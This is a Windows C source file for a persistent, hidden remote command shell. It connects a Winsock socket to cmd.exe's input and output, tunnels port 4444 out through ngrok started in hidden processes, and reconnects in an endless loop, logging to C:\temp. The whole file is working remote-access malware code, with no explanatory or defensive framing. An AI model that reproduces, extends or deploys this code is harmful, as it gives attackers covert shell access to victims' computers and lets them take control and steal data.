#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax;
char ip_addr[64] = "127.0.0.1"; 
char port[6] = "4444";

STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

void log_message(const char* msg) {
    FILE *f = fopen("C:\\temp\\tampa.txt", "a");
    if (f) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        fprintf(f, "[%04d-%02d-%02d %02d:%02d:%02d] %s\n",
                st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, msg);
        fclose(f);
    }
}

void run_hidden_cmd(const char *cmdline) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    CreateProcess(NULL, (LPSTR)cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void setup_ngrok() {
    run_hidden_cmd("cmd.exe /C ngrok config add-authtoken <YOUR_TOKEN_HERE>");
    Sleep(2000);

    run_hidden_cmd("cmd.exe /C start /min ngrok tcp --remote-addr=your-reserved-name.ngrok-free.app:4444 4444");
    Sleep(3000);
}

int connect_and_run() {
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        log_message("WSAStartup failed");
        return 1;
    }

    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (Winsock == INVALID_SOCKET) {
        log_message("WSASocket failed");
        WSACleanup();
        return 1;
    }

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    if (WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        char buf[100];
        sprintf(buf, "Connection failed, error: %d", WSAGetLastError());
        log_message(buf);
        closesocket(Winsock);
        WSACleanup();
        return 1;
    }

    log_message("Connected!");

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("cmd.exe");

    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info)) {
        char buf[100];
        sprintf(buf, "CreateProcess failed, error: %lu", GetLastError());
        log_message(buf);
        closesocket(Winsock);
        WSACleanup();
        return 1;
    }

    WaitForSingleObject(processo_info.hProcess, INFINITE);

    CloseHandle(processo_info.hProcess);
    CloseHandle(processo_info.hThread);
    closesocket(Winsock);
    WSACleanup();

    log_message("Process ended, restarting connection...");

    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    CreateDirectory("C:\\temp", NULL);

    setup_ngrok();

    while (1) {
        int result = connect_and_run();
        if (result != 0) {
            log_message("Retrying in 5 seconds...");
            Sleep(5000);
        } else {
            Sleep(1000);
        }
    }

    return 0;
}
